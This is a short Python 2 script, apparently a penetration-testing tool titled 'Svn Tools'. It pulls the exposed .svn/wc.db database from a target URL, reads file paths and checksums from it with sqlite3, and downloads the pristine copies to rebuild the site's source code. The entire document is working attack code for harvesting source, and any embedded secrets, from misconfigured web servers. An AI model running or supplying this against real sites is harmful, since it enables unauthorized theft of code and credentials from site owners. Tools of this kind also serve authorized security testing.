#!/usr/bin/env python      
#coding:utf-8
import requests
import os
import sys
 
print '''
 ----
    _____               ______            __    
  / ___/   ______     /_  __/___  ____  / /____
  \__ \ | / / __ \     / / / __ \/ __ \/ / ___/
 ___/ / |/ / / / /    / / / /_/ / /_/ / (__  ) 
/____/|___/_/ /_/    /_/  \____/\____/_/____/  
                
 ---- 
'''
 
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}
 
def getfilename(url):
    with open('wc.db','wb') as f:
        content = requests.get(url=url+'/.svn/wc.db',headers=headers).content
        f.write(content)
 
    with open('svn.txt','w') as file:
        info = os.popen("""sqlite3 wc.db 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES;'""").read()
        #print info
        file.write(info)
 
    os.remove('wc.db')
 
 
def restore_svn(url):
    getfilename(url)
    if not os.path.exists('./svn'):
        os.mkdir('svn')
    with open('svn.txt') as f:
        for file in f:
            tmp = file.strip().split('|')
            #print tmp
            if len(tmp) == 1:
                continue
            name = tmp[0]
            path = tmp[1]
            if '/' in name:
                book = os.path.dirname(name)
                if not os.path.exists('./svn/'+book):
                    os.makedirs('./svn/'+book)
 
 
            print 'download:','./svn/'+name
            try:
                with open('./svn/'+name,'w') as f:
                    req = requests.get(url+path,headers=headers)
                    f.write(req.content)
            except Exception,e:
                #print e 
                pass
 
if __name__ == '__main__':
    restore_svn(sys.argv[-1])